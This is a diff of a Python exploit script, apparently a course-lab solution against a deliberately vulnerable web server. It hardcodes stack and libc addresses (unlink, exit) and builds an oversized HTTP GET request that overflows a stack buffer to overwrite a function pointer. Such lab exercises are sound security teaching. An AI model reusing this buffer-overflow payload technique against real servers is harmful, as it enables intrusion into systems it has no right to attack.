@@ -17,9 +17,12 @@ import struct
 # which you can then use in build_exploit(); the following are just
 # examples.
 
-stack_buffer = 0x34567890
-stack_saved_ebp = 0x12345678
-stack_retaddr = stack_saved_ebp + 4
+stack_buffer = 0xbfffd9fc 
+function_pointer = 0xbfffddfc
+
+libc_unlink_addr = 0x40102450 
+path_arg_addr = 0x08050e90 
+libc_exit_addr = 0x40058150
 
 
 # This is the function that you should modify to construct an
@@ -40,18 +43,20 @@ def build_exploit(shellcode):
     # strings, not byte strings. You should take care to use the latter over
     # the former (e.g. b'hello world').
 
+    targetsize = function_pointer - stack_buffer 
+    hello = b'/zoobar/media/'
+    targetsize -= len(hello)  
+    for i in range(targetsize):
+        hello += b'A'
+    for i in range(20):
+        hello += b'\x11\x11\x11\x11'
+    
 
-    bigstuff = b''
-    # for i in range(8170):
-    #     bigstuff += b's'
-
-    hello = b''
-    for i in range((8192 - 15) // 5):
-        hello += b'/abcd'
-    test = b'GET ' + hello + b'%00' + b' HTTP/1.0\r\n'
-
+    test = b''
+    test += b'GET '
+    test += hello
+    test += b' HTTP/1.0\r\n\r\n'
     return test
-
 
 def send_req(host, port, req):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
